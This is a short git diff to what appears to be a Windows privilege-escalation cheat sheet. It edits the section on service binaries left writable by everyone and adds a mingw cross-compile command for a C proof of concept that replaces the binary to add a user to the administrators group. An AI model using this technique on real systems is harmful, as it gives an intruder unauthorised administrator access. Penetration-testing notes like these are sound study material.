@@ -43,9 +43,10 @@ If we have an exploit written in python but we don't have python installed on th
 
 #### Incorrect file and service permissions
 
-If you find a service that has read-write permissions set to everyone you can just change that binary into a binary that adds a user with admin privileges.
+If you find a service that has read-write permissions set to everyone you can just change that binary into a binary that adds a user to the administrators'group and thereby giving it privileges.
 
 Here is a POC code for this
+
 ```c
 #include <stdlib.h>
 int main ()
@@ -56,6 +57,11 @@ return 0;
 }
 ```
 
+We then compile it with out cross-compiler, if you are on linux, like this:
+
+```
+i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o pro.exe
+```
 
 
 ### Unquoted Service Paths
